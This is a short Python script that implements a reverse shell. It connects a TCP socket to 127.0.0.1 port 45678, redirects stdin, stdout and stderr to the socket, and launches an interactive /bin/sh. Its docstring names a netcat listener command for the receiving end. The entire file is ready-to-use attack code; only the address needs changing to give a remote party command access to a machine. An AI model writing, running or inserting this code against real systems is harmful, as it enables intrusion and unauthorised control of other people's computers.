import socket
import subprocess
import os

"""
The server is responsible for listening for incoming connections on a specific port.
The client is responsible for connecting to the server.
netcat -nvlp 45678 on server
"""

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(('127.0.0.1', 45678))
sock.send(b'[*] Connection Established!')

# Duplicate file descriptors for STDIN, STDOUT and STDERR
os.dup2(sock.fileno(), 0)
os.dup2(sock.fileno(), 1)
os.dup2(sock.fileno(), 2)

# Create a remote shell
shell_remote = subprocess.call(["/bin/sh", "-i"])

# Start to issue commands to the remote shell
proc = subprocess.call(["/bin/sh", "-i"])